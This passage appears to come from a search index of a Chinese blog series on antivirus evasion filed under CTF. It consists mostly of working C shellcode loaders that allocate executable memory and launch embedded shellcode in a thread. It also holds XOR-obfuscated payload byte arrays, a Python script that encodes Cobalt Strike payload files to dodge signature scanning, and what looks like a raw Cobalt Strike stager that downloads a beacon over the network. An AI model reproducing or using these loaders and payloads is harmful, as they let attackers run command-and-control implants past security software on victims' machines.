&lt;Windows.h&gt;\n\n// \u5165\u53e3\u51fd\u6570\nint wmain(int argc, TCHAR* argv[]) {\n\n    int shellcode_size = 0; // shellcode\u957f\u5ea6\n    DWORD dwThreadId; // \u7ebf\u7a0bID\n    HANDLE hThread; // \u7ebf\u7a0b\u53e5\u67c4\n/* length: 800 bytes */\n    unsigned char buf[] = \"\\xf6\\xe2\\x88\\xa\\xa\\xa\\x6a\\x83\\xef\\x3b\\xca\\x6e\\x81\\x5a\\x3a\\x81\\x58\\x6\\x81\\x58\\x1e\\x81\\x78\\x22\\x5\\xbd\\x40\\x2c\\x3b\\xf5\\xa6\\x36\\x6b\\x76\\x8\\x26\\x2a\\xcb\\xc5\\x7\\xb\\xcd\\xe8\\xf8\\x58\\x5d\\x81\\x58\\x1a\\x81\\x40\\x36\\x81\\x46\\x1b\\x72\\xe9\\x42\\xb\\xdb\\x5b\\x81\\x53\\x2a\\xb\\xd9\\x81\\x43\\x12\\xe9\\x30\\x43\\x81\\x3e\\x81\\xb\\xdc\\x3b\\xf5\\xa6\\xcb\\xc5\\x7\\xb\\xcd\\x32\\xea\\x7f\\xfc\\x9\\x77\\xf2\\x31\\x77\\x2e\\x7f\\xee\\x52\\x81\\x52\\x2e\\xb\\xd9\\x6c\\x81\\x6\\x41\\x81\\x52\\x16\\xb\\xd9\\x81\\xe\\x81\\xb\\xda\\x83\\x4e\\x2e\\x2e\\x51\\x51\\x6b\\x53\\x50\\x5b\\xf5\\xea\\x55\\x55\\x50\\x81\\x18\\xe1\\x87\\x57\\x60\\xb\\x87\\x8f\\xb8\\xa\\xa\\xa\\x5a\\x62\\x3b\\x81\\x65\\x8d\\xf5\\xdf\\xb1\\xfa\\xbf\\xa8\\x5c\\x62\\xac\\x9f\\xb7\\x97\\xf5\\xdf\\x36\\xc\\x76\\x0\\x8a\\xf1\\xea\\x7f\\xf\\xb1\\x4d\\x19\\x78\\x65\\x60\\xa\\x59\\xf5\\xdf\\x69\\x6b\\x66\\x69\\x24\\x6f\\x72\\x6f\\xa\\xa\";\n    int shellcodesize = sizeof(buf);\n        // \u83b7\u53d6shellcode\u5927\u5c0f\n\n    /*\nVirtualAlloc\u51fd\u6570\uff0c\u5728\u8c03\u7528\u8fdb\u7a0b\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e2d\u4fdd\u7559\u3001\u63d0\u4ea4\u6216\u66f4\u6539\u9875\u9762\u533a\u57df\u7684\u72b6\u6001\u3002\n    VirtualAlloc(\n        NULL, // \u57fa\u5740\n        800,  // \u5927\u5c0f\n        MEM_COMMIT, // \u5185\u5b58\u9875\u72b6\u6001\n        PAGE_EXECUTE_READWRITE // \u53ef\u8bfb\u53ef\u5199\u53ef\u6267\u884c\n        );\n\u5982\u679c\u51fd\u6570\u6210\u529f\uff0c\u5219\u8fd4\u56de\u503c\u662f\u5206\u914d\u7684\u9875\u9762\u533a\u57df\u7684\u57fa\u5730\u5740\u3002\n\u5982\u679c\u51fd\u6570\u5931\u8d25\uff0c\u5219\u8fd4\u56de\u503c\u4e3aNULL\u3002\u8981\u83b7\u53d6\u6269\u5c55\u7684\u9519\u8bef\u4fe1\u606f\uff0c\u8bf7\u8c03\u7528GetLastError\u3002\n    */\n    char* shellcode = (char*)VirtualAlloc(\n        NULL,\n        shellcode_size,\n        MEM_COMMIT,\n        PAGE_EXECUTE_READWRITE\n    );\n    // \u5c06shellcode\u590d\u5236\u5230\u53ef\u6267\u884c\u7684\u5185\u5b58\u9875\u4e2d\n    //CopyMemory\u5c06\u4e00\u5757\u5185\u5b58\u4ece\u4e00\u4e2a\u4f4d\u7f6e\u590d\u5236\u5230\u53e6\u4e00\u4e2a\u4f4d\u7f6e\u3002\u53ef\u80fd\u4f1a\u9020\u6210\u7f13\u51b2\u533a\u6ea2\u51fa\n    /*\nvoid CopyMemory(\n  _In_       PVOID  \u6307\u5411\u590d\u5236\u5757\u76ee\u6807\u8d77\u59cb\u5730\u5740\u7684\u6307\u9488,\n  _In_ const VOID   \u6307\u5411\u8981\u590d\u5236\u7684\u5185\u5b58\u5757\u7684\u8d77\u59cb\u5730\u5740\u7684\u6307\u9488,\n  _In_       SIZE_T \u957f\u5ea6\uff0c\n);\n    */\n    CopyMemory(shellcode, buf, shellcode_size);\n//CreateThread\u51fd\u6570\uff0c\u521b\u5efa\u7ebf\u7a0b\n    hThread = CreateThread(\n        NULL, // \u5b89\u5168\u63cf\u8ff0\u7b26\n        NULL, // \u6808\u7684\u5927\u5c0f\n        (LPTHREAD_START_ROUTINE)shellcode, // \u51fd\u6570\n        NULL, // \u53c2\u6570\n        NULL, // \u7ebf\u7a0b\u6807\u5fd7\n        &amp;dwThreadId // \u82e5\u6210\u529f\uff0c\u63a5\u6536\u65b0\u521b\u5efa\u7684\u7ebf\u7a0b\u7684\u7ebf\u7a0bID DWORD\u53d8\u91cf\u7684\u5730\u5740\u3002\n    );\n    //\u901a\u8fc7\u8c03\u7528 WaitForSingleObject \u51fd\u6570\u6765\u76d1\u89c6\u4e8b\u4ef6\u72b6\u6001,\u5f53\u4e8b\u4ef6\u8bbe\u7f6e\u4e3a\u7ec8\u6b62\u72b6\u6001\uff08WaitForSingleObject \u8fd4\u56de WAIT_OBJECT_0\uff09\u65f6\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u5c06\u81ea\u884c\u7ec8\u6b62\u6267\u884c\u3002\n    WaitForSingleObject(hThread, INFINITE); // \u4e00\u76f4\u7b49\u5f85\u7ebf\u7a0b\u6267\u884c\u7ed3\u675f\n    return 0;\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/Article3/index.html#_1","title":"\u5185\u5b58\u7533\u8bf7\u4f18\u5316","text":"<p>\u7533\u8bf7\u5185\u5b58\u9875\u65f6\uff0c\u53ef\u4ee5\u5728Shellcode\u8bfb\u5165\u65f6\uff0c\u7533\u8bf7\u4e00\u4e2a\u666e\u901a\u7684\u53ef\u8bfb\u5199\u7684\u5185\u5b58\u9875\uff0c\u7136\u540e\u518d\u901a\u8fc7VirtualProtect\u6539\u53d8\u5b83\u7684\u5c5e\u6027 -&gt; \u53ef\u6267\u884c\u3002\u8fd9\u6837\u4e5f\u80fd\u89c4\u907f\u6389\u4e00\u4e9b\u7279\u5f81\u67e5\u6740\u3002</p> <pre><code>int wmain(int argc, TCHAR* argv[]) {\n    int shellcode_size = 0; //shellcode\u957f\u5ea6\n    DWORD dwThreadId;   //\u7ebf\u7a0bId\n    HANDLE hThread;     //\u7ebf\u7a0b\u53e5\u67c4\n    DWORD dwOldProtect; //\u5185\u5b58\u9875\u5c5e\u6027\n\n    unsigned char buf[] = \"\";\n    shellcode_size = sizeof(buf);\n    for (int i = 0; i &lt; shellcode_size; i++)\n    {\n        buf[i] ^= 10;\n    }\n\n    char* shellcode = (char*)VirtualAlloc(\n        NULL,\n        shellcode_size,\n        MEM_COMMIT,\n        PAGE_READWRITE  //\u53ea\u7533\u8bf7\u53ef\u8bfb\u53ef\u5199\n        );\n    CopyMemory(shellcode, buf, shellcode_size); //\u5c06shellcode\u590d\u5236\u5230\u53ef\u8bfb\u53ef\u5199\u7684\u5185\u5b58\u4e2d\n    //VirtualProtect \u7684 Win32 \u5b9e\u73b0\u5c06\u66f4\u6539\u5bf9\u8c03\u7528\u8fdb\u7a0b\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e2d\u5df2\u63d0\u4ea4\u9875\u9762\u533a\u57df\u7684\u4fdd\u62a4\u3002\n    /*\n    HRESULT VirtualProtect (\n    [in]  void*   lpAddress,//\u4e00\u4e2a\u6307\u9488\uff0c\u6307\u5411\u8981\u66f4\u4fdd\u62a4\u5c5e\u6027\u7684\u865a\u62df\u5185\u5b58\u7684\u57fa\u5740\n    [in]  SIZE_T  dwSize,//\u8981\u66f4\u6539\u7684\u5185\u5b58\u9875\u9762\u533a\u57df\u7684\u5927\u5c0f\uff08\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\uff09\u3002\n    [in]  DWORD   flNewProtect, //\u8981\u5e94\u7528\u7684\u5185\u5b58\u4fdd\u62a4\u7684\u7c7b\u578b\u3002\n    [out] DWORD*  pflOldProtect //\u4e00\u4e2a\u6307\u9488\uff0c\u8be5\u6307\u9488\u6307\u5411\u524d\u4e00\u4e2a\u5185\u5b58\u4fdd\u62a4\u503c\u3002\n);\n    */\n    VirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect); //\u66f4\u6539\u5c5e\u6027\u4e3a\u53ef\u6267\u884c\n        hThread = CreateThread(\n            NULL, // \u5b89\u5168\u63cf\u8ff0\u7b26\n            NULL, // \u6808\u7684\u5927\u5c0f\n            (LPTHREAD_START_ROUTINE)shellcode, // \u51fd\u6570\n            NULL, // \u53c2\u6570\n            NULL, // \u7ebf\u7a0b\u6807\u5fd7\n            &amp;dwThreadId // \u7ebf\u7a0bID\n        );\n\n        WaitForSingleObject(hThread, INFINITE);\n        return 0;\n\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/Article3/index.html#_2","title":"\u5f02\u6216\u65b9\u5f0f\u4f18\u5316","text":"<p>\u901a\u5e38\uff0c\u6211\u4eec\u4f7f\u7528\u5faa\u73af\u53bb\u8fdb\u884c\u5f02\u6216\u8fd0\u7b97\uff0c\u4f1a\u4f7f\u7528\u5230\u5f02\u6216\u8fd0\u7b97\u7b26\uff0c\u8fd9\u91cc\u662f\u8f83\u4e3a\u654f\u611f\u7684\u64cd\u4f5c\u3002InterlockedXorRelease\u51fd\u6570\u53ef\u4ee5\u7528\u4e8e\u4e24\u4e2a\u503c\u7684\u5f02\u6216\u8fd0\u7b97\uff0c\u6700\u91cd\u8981\u7684\u4e00\u70b9\u5c31\u662f\uff0c\u5b83\u7684\u64cd\u4f5c\u662f\u539f\u5b50\u7684\uff0c\u4e5f\u5c31\u662f\u53ef\u4ee5\u8fbe\u5230\u7ebf\u7a0b\u540c\u6b65\u3002</p> <pre><code>char buf[] = \"\\x4d\\x59\\x3e\\xb1\\xb1\\xb1\\xd1\\x80\\x63\\x38\\x54\\xd5\\x3a\\xe3\\x81\\x3a\\xe3\\xbd\\x3a\\xe3\\xa5\\x3a\\xc3\\x99\\x80\\x4e\\xbe\\x6\\xfb\\x97\\x80\\x71\\x1d\\x8d\\xd0\\xcd\\xb3\\x9d\\x91\\x70\\x7e\\xbc\\xb0\\x76\\xf8\\xc4\\x5e\\xe3\\x3a\\xe3\\xa1\\xe6\\x95\\xbe\\x34\\xc1\\x4e\\x4e\\x4e\\x58\\x2a\\x4e\\x4e\\x4e\\xb0\\x72\\x98\\x77\\xc4\\x70\\x72\\xa\\x41\\x4\\x13\\xe7\\xdb\\xb1\\xe2\\x4e\\x64\\xb1\";\nshellcode_size = sizeof(buf);\nfor (int i = 0; i &lt; shellcode_size; i++)\n{\n    Sleep(1);\n    _InterlockedXor8(buf+i, 177);\n}\n</code></pre> <p>\u5b8c\u6574\u4ee3\u7801</p> <pre><code>#include&lt;Windows.h&gt;\nint wmain(int argc, TCHAR* argv[]) {\n    int shellcode_size = 0;\n    DWORD dwThreadId; //\u7ebf\u7a0bid\n    HANDLE hThread;//\u7ebf\u7a0b\u53e5\u67c4\n    DWORD dwOldProtect; //\u5185\u5b58\u9875\u5c5e\u6027\n\n    char buf[] = \"\\x66\\x72\\x18\\x9a\\x9a\\x9a\\xfa\\x13\\x7f\\xab\\x5a\\xfe\\x11\\xca\\xaa\\x11\\xc8\\x96\\x11\\xc8\\x8e\\x11\\xe8\\xb2\\x95\\x2d\\xd0\\xbc\\xab\\x65\\x36\\xa6\\xfb\\xe6\\x98\\xb6\\xba\\x5b\\x55\\x97\\x9b\\x5d\\x78\\x68\\xc8\\xcd\\x11\\xc8\\x8a\\x11\\xd0\\xa6\\x11\\xd6\\x8b\\xe2\\x79\\xd2\\x9b\\x4b\\xcb\\x11\\xc3\\xba\\x9b\\x49\\x11\\xd3\\x82\\x79\\xa0\\xd3\\x11\\xae\\x11\\x9b\\x4c\\xab\\x65\\x36\\x5b\\x55\\x97\\x9b\\x5d\\xa2\\x7a\\xef\\x6c\\x99\\xe7\\x62\\xa1\\xe7\\xbe\\xef\\x7e\\xc2\\x11\\xc2\\xbe\\x9b\\x49\\xfc\\x11\\x96\\xd1\\x11\\xc2\\x86\\x9b\\x49\\x11\\x9e\\x11\\x9b\\x4a\\x13\\xde\\xbe\\xbe\\xc1\\xc1\\xfb\\xc3\\xc0\\xcb\\x65\\x7a\\xc5\\xc5\\xc0\\x11\\x88\\x71\\x17\\xc7\\xf0\\x9b\\x17\\x1f\\x28\\x9a\\x9a\\x9a\\xca\\xf2\\xab\\x11\\xf5\\x1d\\x65\\x4f\\x21\\x6a\\x2f\\x38\\xcc\\xf2\\x3c\\xf\\x27\\x7\\x65\\x4f\\xa6\\x9c\\xe6\\x90\\x1a\\x61\\x7a\\xef\\x9f\\x21\\xdd\\x89\\xe8\\xf5\\xf0\\x9a\\xc9\\x65\\x4f\\xf9\\xfb\\xf6\\xf9\\xb4\\xff\\xe2\\xff\\x9a\\x9a\";\n    shellcode_size = sizeof(buf);\n    for (int i = 0; i &lt; shellcode_size; i++)\n    {\n        _InterlockedXor8(buf + i, 7834);\n    }\n    char* shellcode = (char*)VirtualAlloc(\n        NULL,//\u57fa\u5740\n        shellcode_size,  //\u5927\u5c0f\n        MEM_COMMIT, //\u5185\u5b58\u9875\u72b6\u6001\n        PAGE_READWRITE //\u53ef\u8bfb\u53ef\u5199\u53ef\u6267\u884c\n    );\n\n    CopyMemory(shellcode, buf, shellcode_size);\n    VirtualProtect(shellcode, shellcode_size, PAGE_EXECUTE, &amp;dwOldProtect);\n    Sleep(2000);\n    hThread = CreateThread(\n        NULL, // \u5b89\u5168\u63cf\u8ff0\u7b26\n        NULL, // \u6808\u7684\u5927\u5c0f\n        (LPTHREAD_START_ROUTINE)shellcode, // \u51fd\u6570\n        NULL, // \u53c2\u6570\n        NULL, // \u7ebf\u7a0b\u6807\u5fd7\n        &amp;dwThreadId // \u7ebf\u7a0bID\n    );\n    WaitForSingleObject(hThread, INFINITE);\n    return 0;\n}\n</code></pre> <p>\u76f8\u6bd4\u76f4\u63a5\u7533\u8bf7\u5185\u5b58\u6267\u884c\uff0c\u514d\u6740\u6548\u679c\u597d\u4e86\u4e00\u4e9b\u3002\u4f46\u8fdc\u4e0d\u80fd\u8ba9\u4eba\u6ee1\u610f\uff0c\u5c06shellcode\u7f6e\u7a7a\uff0c\u76f4\u63a5\u5bf9\u52a0\u8f7d\u5668\u8fdb\u884c\u67e5\u6740\uff0c\u67e5\u6740\u7387\u4e3a23/67\uff0cC++\u7533\u8bf7\u5185\u5b58\u6267\u884c\u7684\u7279\u5f81\u592a\u660e\u663e\u3002</p> <p></p>"},{"location":"CTF/Antimalware_evasion/Catalogue/index.html","title":"\u9759\u6001\u6076\u610f\u4ee3\u7801\u9003\u9038","text":"<ul> <li>Lesson One</li> <li>Lesson Two</li> </ul>"},{"location":"CTF/Antimalware_evasion/Catalogue/Article1/index.html","title":"TL;DR","text":"<p>\u9759\u6001\u6076\u610f\u4ee3\u7801\u9003\u9038\uff08Static Malware Evasion\uff09\u6307\u7684\u662f\u6076\u610f\u8f6f\u4ef6\u4f7f\u7528\u5404\u79cd\u6280\u672f\u6765\u9003\u907f\u9759\u6001\u5206\u6790\u7684\u68c0\u6d4b\u3002\u9759\u6001\u5206\u6790\u662f\u4e00\u79cd\u4e0d\u6267\u884c\u7a0b\u5e8f\u4ee3\u7801\uff0c\u4ec5\u901a\u8fc7\u68c0\u67e5\u4ee3\u7801\u3001\u6587\u4ef6\u7ed3\u6784\u548c\u5176\u4ed6\u9759\u6001\u5c5e\u6027\u6765\u68c0\u6d4b\u548c\u5206\u6790\u6076\u610f\u8f6f\u4ef6\u7684\u65b9\u6cd5\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5e38\u89c1\u7684\u9759\u6001\u6076\u610f\u4ee3\u7801\u9003\u9038\u6280\u672f\uff1a</p> <ul> <li>\u4ee3\u7801\u6df7\u6dc6</li> <li>\u52a0\u5bc6\u548c\u538b\u7f29</li> <li>\u5206\u6bb5\u52a0\u8f7d</li> <li>\u5b57\u7b26\u4e32\u9690\u85cf</li> <li>\u53cd\u9006\u5411\u5de5\u7a0b\u6280\u672f</li> <li>\u4f2a\u4ee3\u7801\u63d2\u5165</li> <li>\u591a\u6001\u548c\u53d8\u5f62</li> </ul>"},{"location":"CTF/Antimalware_evasion/Catalogue/Article1/index.html#0x01","title":"0X01 \u6076\u610f\u4ee3\u7801\u7684\u5b9a\u4e49","text":"<p>\u5173\u4e8e\u6076\u610f\u4ee3\u7801\u7684\u5b9a\u4e49\u90fd\u4ee5Cobaltstrike\u7684\u8f7d\u8377\u4e3a\u4f8b</p>"},{"location":"CTF/Antimalware_evasion/Catalogue/Article1/index.html#0x02-shellcode","title":"0x02 Shellcode\u5b9a\u4e49","text":"<p>Shellcode\u662f\u4e00\u6bb5\u673a\u5668\u6307\u4ee4\u7684\u96c6\u5408\uff0c\u901a\u5e38\u4f1a\u88ab\u538b\u7f29\u81f3\u5f88\u5c0f\u7684\u957f\u5ea6\uff0c\u8fbe\u5230\u4e3a\u540e\u7eed\u6076\u610f\u4ee3\u7801\u94fa\u57ab\u7684\u4f5c\u7528\u3002\u5f53\u7136\u4f60\u53ef\u4ee5\u901a\u8fc7msfvenom\u751f\u6210\u5404\u79cd\u7528\u4e8e\u6d4b\u8bd5\u7684shellcode\u3002</p>"},{"location":"CTF/Antimalware_evasion/Catalogue/Article1/index.html#0x03-raw","title":"0x03 RAW\u6587\u4ef6","text":"<p>RAW \u4e2d\u6587\u610f\u601d\u662f\u539f\u59cb\u7684\u3001\u672a\u7ecf\u52a0\u5de5\u7684\uff0c\u901a\u5e38\u4f7f\u7528Cobaltstrike\u751f\u6210\u7684BIN\u6587\u4ef6\u3002</p> <p></p> <p>RAW\u6587\u4ef6\u662f\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5b57\u8282\u64cd\u4f5c\u8bfb\u53d6\u7684\uff0c\u56e0\u6b64\u52a0\u8f7d\u5230\u5185\u5b58\u8f83\u4e3a\u65b9\u4fbf\uff0c\u901a\u5e38\u4e00\u822c\u4f7f\u7528\u6df7\u6dc6\u7684\u65b9\u5f0f\u518d\u751f\u6210\u4e00\u904d\u3002</p>"},{"location":"CTF/Antimalware_evasion/Catalogue/Article1/index.html#0x04-c","title":"0x04 C\u6587\u4ef6","text":"<p>C\u6587\u4ef6\u7ed9\u51fa\u7684\u662f\u4e00\u4e2aC\u8bed\u8a00\u4e2d\u7684\u5b57\u7b26\u6570\u7ec4\uff0c\u4e5f\u662f\u53ef\u4ee5\u901a\u8fc7\u4ee5\u5b57\u8282\u5355\u4f4d\u64cd\u4f5c\u7684\u3002</p>"},{"location":"CTF/Antimalware_evasion/Catalogue/Article1/index.html#0x05","title":"0x05 \u7ec4\u5408","text":"<p>\u7531\u4e8e\u53cd\u75c5\u6bd2\u8f6f\u4ef6\u5bf9\u4e8e\u9ed8\u8ba4\u751f\u6210\u7684\u6587\u4ef6\u67e5\u6740\u8f83\u4e3a\u4e25\u683c\uff0c\u6211\u901a\u5e38\u4f1a\u91c7\u7528\u6df7\u6dc6\u3001\u52a0\u5bc6\u89e3\u5bc6\u7684\u65b9\u5f0f\u628a\u8f7d\u8377\u8fd8\u539f\u3002</p> <pre><code>import sys\nfrom argparse import ArgumentParser, FileType\nimport logging\n\ndef process_bin(num, src_fp, dst_fp, dst_raw):\n    shellcode = ''\n    shellcode_size = 0\n    shellcode_raw = b''\n    try:\n        while (code := src_fp.read(1)):\n            base10 = ord(code) ^ num\n            shellcode_raw += base10.to_bytes(1, 'little')\n            code_hex = f'{base10:02x}'\n            shellcode += f'\\\\x{code_hex}'\n            shellcode_size += 1\n\n        dst_raw.write(shellcode_raw)\n        dst_fp.write(shellcode)\n        return shellcode_size\n    except Exception as e:\n        logging.error(f\"Error processing binary: {str(e)}\")\n        return 0\n\ndef main():\n    parser = ArgumentParser(prog='Shellcode X', description='[XOR The Cobaltstrike PAYLOAD.BINs] \\t &gt; Author: rvn0xsy@gmail.com')\n    parser.add_argument('-v', '--version', action='version', version='Shellcode X 1.0')\n    parser.add_argument('-s', '--src', help='source bin file', type=FileType('rb'), required=True)\n    parser.add_argument('-d', '--dst', help='destination shellcode file', type=FileType('w+'), required=True)\n    parser.add_argument('-n', '--num', help='Confused number', type=int, default=90)\n    parser.add_argument('-r', '--raw', help='output bin file', type=FileType('wb'), required=True)\n    args = parser.parse_args()\n\n    with args.src as src_fp, args.dst as dst_fp, args.raw as dst_raw:\n        shellcode_size = process_bin(args.num, src_fp, dst_fp, dst_raw)\n\n    print(f\"[+] Shellcode Size : {shellcode_size}\")\n\nif __name__ == \"__main__\":\n    logging.basicConfig(level=logging.INFO)\n    main()\n</code></pre> <p>\u4e0a\u9762\u8fd9\u4e2a\u811a\u672c\u7528\u4e8e\u628araw\u6587\u4ef6\u6df7\u6dc6\uff0c\u751f\u6210c\u8bed\u8a00\u6570\u7ec4\uff0c\u5728\u540e\u9762\u7684\u6587\u7ae0\u4e2d\uff0c\u6211\u4eec\u4e5f\u4ee5c/c++\u8bed\u8a00\u4e3a\u4e3b\uff0c\u63a2\u7a76\u5176\u672c\u8d28\u3002</p>"},{"location":"CTF/Antimalware_evasion/Catalogue/Article1/index.html#_1","title":"\u6df7\u6dc6\u65b9\u6848","text":"<p>\u5148\u751f\u6210bin\u6587\u4ef6\uff0c\u7136\u540e\u8fd0\u884cpython\u811a\u672c\uff1a</p> <pre><code>python3 .\\main.py -s .\\payload.bin  -d payload.c -n 10 -r out.bin\n</code></pre> <p>\u5728payload.c\u4e2d\u4f1a\u770b\u5230raw\u6587\u4ef6\u91cc\u7684\u6bcf\u4e00\u4e2a\u5b57\u8282\u4e0e10\u7684\u5f02\u6216\u8fd0\u7b97\u51fa\u7684C\u8bed\u8a00\u6570\u7ec4\u3002</p> <p></p> <p>\u8fd9\u4e2a\u6570\u7ec4\u7684\u5185\u5bb9\uff0c\u5c06\u7531\u4e0b\u4e00\u7bc7\u6587\u7ae0\u7528\u5230\uff0c\u5b9e\u8df5\u4e00\u4e0bShellcode\u6df7\u6dc6\u514d\u6740\u3002</p> <p>\u6ce8\uff1a-r \u53c2\u6570\u8f93\u51fa\u7684\u662f\u6df7\u6dc6\u8fc7\u7684\u4e8c\u8fdb\u5236\u7248\u672cshellcode\uff0c-d \u53c2\u6570\u8f93\u51fa\u7684\u662fC\u8bed\u8a00\u683c\u5f0f\u7684shellcode</p>"},{"location":"CTF/Antimalware_evasion/Catalogue/Article2/index.html","title":"0x01 \u5173\u4e8eWindows\u64cd\u4f5c\u7cfb\u7edf\u5185\u5b58","text":"<p>Windows\u64cd\u4f5c\u7cfb\u7edf\u7684\u5185\u5b58\u6709\u4e09\u79cd\u5c5e\u6027\uff0c\u5206\u522b\u4e3a\uff1a\u53ef\u8bfb\u3001\u53ef\u5199\u3001\u53ef\u6267\u884c\uff0c\u5e76\u4e14\u64cd\u4f5c\u7cfb\u7edf\u5c06\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u5185\u5b58\u90fd\u9694\u79bb\u5f00\u6765\uff0c\u5f53\u8fdb\u7a0b\u8fd0\u884c\u65f6\uff0c\u521b\u5efa\u4e00\u4e2a\u865a\u62df\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u7cfb\u7edf\u7684\u5185\u5b58\u7ba1\u7406\u5668\u5c06\u865a\u62df\u5185\u5b58\u7a7a\u95f4\u6620\u5c04\u5230\u7269\u7406\u5185\u5b58\u4e0a\uff0c\u6240\u4ee5\u6bcf\u4e2a\u8fdb\u7a0b\u7684\u5185\u5b58\u90fd\u662f\u7b49\u5927\u7684\u3002</p> <p>\u5728\u8fdb\u7a0b\u7533\u8bf7\u65f6\uff0c\u9700\u8981\u58f0\u660e\u8fd9\u5757\u5185\u5b58\u7684\u57fa\u672c\u4fe1\u606f\uff1a\u7533\u8bf7\u5185\u5b58\u5927\u5c0f\u3001\u7533\u8bf7\u5185\u5b58\u8d77\u59cb\u5185\u5b58\u57fa\u5740\u3001\u7533\u8bf7\u5185\u5b58\u5c5e\u6027\u3001\u7533\u8bf7\u5185\u5b58\u5bf9\u5916\u7684\u6743\u9650\u7b49\u3002</p> <p>\u7533\u8bf7\u65b9\u5f0f\uff1a</p> <ul> <li>HeapAlloc</li> <li>malloc</li> <li>VirtualAlloc</li> <li>new</li> <li>LocalAlloc</li> </ul>"},{"location":"CTF/Antimalware_evasion/Catalogue/Article2/index.html#0x02-api","title":"0x02 \u7533\u8bf7\u5185\u5b58API\u7684\u5173\u7cfb","text":"<p>\u5176\u5b9e\u4ee5\u4e0a\u6240\u6709\u7684\u5185\u5b58\u7533\u8bf7\u65b9\u5f0f\u90fd\u4e0eVirtualAlloc\u6709\u5173\uff0c\u56e0\u4e3aVirtualAlloc\u7533\u8bf7\u7684\u5355\u4f4d\u662f\u201c\u9875\u201d\u3002\u800cWindows\u64cd\u4f5c\u7cfb\u7edf\u7ba1\u7406\u5185\u5b58\u7684\u5355\u4f4d\u4e5f\u662f\u201c\u9875\u201d\u3002</p>"},{"location":"CTF/Antimalware_evasion/Catalogue/Article2/index.html#0x03","title":"0x03 \u5b9e\u73b0\u4e00\u6b21\u6b63\u5e38\u52a0\u8f7d","text":"<p>\u8fd9\u91cc\u6211\u521b\u5efa\u4e86\u4e00\u4e2aC++\u9879\u76ee\uff0c\u540d\u5b57\u4e3a\uff1aBadCode</p> <p>\u5148\u6765\u4f7f\u7528cobaltstrike\u9ed8\u8ba4\u7684shellcode\u8fdb\u884c\u52a0\u8f7d\uff0c\u4e3a\u4e86\u65b9\u4fbf\u9605\u8bfb\u53c2\u8003\uff0c\u5728\u4ee3\u7801\u4e2d\u6211\u4f1a\u5c3d\u91cf\u7559\u4e0b\u6ce8\u91ca\u3002</p> <pre><code>#include &lt;windows.h&gt;\n\n// \u5b9a\u4e49Shellcode\nunsigned char buf[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x75\\x72\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x4f\\xff\\xff\\xff\\x5d\\x6a\\x00\\x49\\xbe\\x77\\x69\\x6e\\x69\\x6e\\x65\\x74\\x00\\x41\\x56\\x49\\x89\\xe6\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x48\\x31\\xc9\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x4d\\x31\\xc9\\x41\\x50\\x41\\x50\\x41\\xba\\x3a\\x56\\x79\\xa7\\xff\\xd5\\xeb\\x73\\x5a\\x48\\x89\\xc1\\x41\\xb8\\x90\\x1f\\x00\\x00\\x4d\\x31\\xc9\\x41\\x51\\x41\\x51\\x6a\\x03\\x41\\x51\\x41\\xba\\x57\\x89\\x9f\\xc6\\xff\\xd5\\xeb\\x59\\x5b\\x48\\x89\\xc1\\x48\\x31\\xd2\\x49\\x89\\xd8\\x4d\\x31\\xc9\\x52\\x68\\x00\\x02\\x40\\x84\\x52\\x52\\x41\\xba\\xeb\\x55\\x2e\\x3b\\xff\\xd5\\x48\\x89\\xc6\\x48\\x83\\xc3\\x50\\x6a\\x0a\\x5f\\x48\\x89\\xf1\\x48\\x89\\xda\\x49\\xc7\\xc0\\xff\\xff\\xff\\xff\\x4d\\x31\\xc9\\x52\\x52\\x41\\xba\\x2d\\x06\\x18\\x7b\\xff\\xd5\\x85\\xc0\\x0f\\x85\\x9d\\x01\\x00\\x00\\x48\\xff\\xcf\\x0f\\x84\\x8c\\x01\\x00\\x00\\xeb\\xd3\\xe9\\xe4\\x01\\x00\\x00\\xe8\\xa2\\xff\\xff\\xff\\x2f\\x4c\\x62\\x63\\x4c\\x00\\x7d\\x0c\\x3f\\x6c\\x10\\xda\\x27\\x3a\\x9a\\xfa\\xb5\\xaf\\x93\\x6f\\x3e\\x84\\x3d\\x1b\\x3a\\xef\\x5e\\x9a\\x5b\\x26\\xb9\\